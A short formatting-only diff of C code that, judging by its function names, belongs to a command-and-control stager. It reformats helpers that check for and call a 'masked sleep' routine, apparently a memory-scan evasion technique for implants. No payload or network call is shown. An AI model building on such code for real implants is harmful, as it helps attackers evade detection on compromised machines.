@@ -52,15 +52,16 @@ int c2_stager_mask_bind(void) {
 #endif
 }
 
-int c2_stager_mask_available(void) { return g_mask_fn != NULL; }
+int c2_stager_mask_available(void) {
+  return g_mask_fn != NULL;
+}
 
 int c2_stager_masked_sleep(unsigned seconds) {
   if (g_mask_fn == NULL)
     return -1;
   if (seconds == 0)
     seconds = 1;
-  return g_mask_fn(seconds,
-                   (uintptr_t)(void *)&c2_stager_masked_sleep) == 0
+  return g_mask_fn(seconds, (uintptr_t)(void *)&c2_stager_masked_sleep) == 0
              ? 0
              : -1;
 }
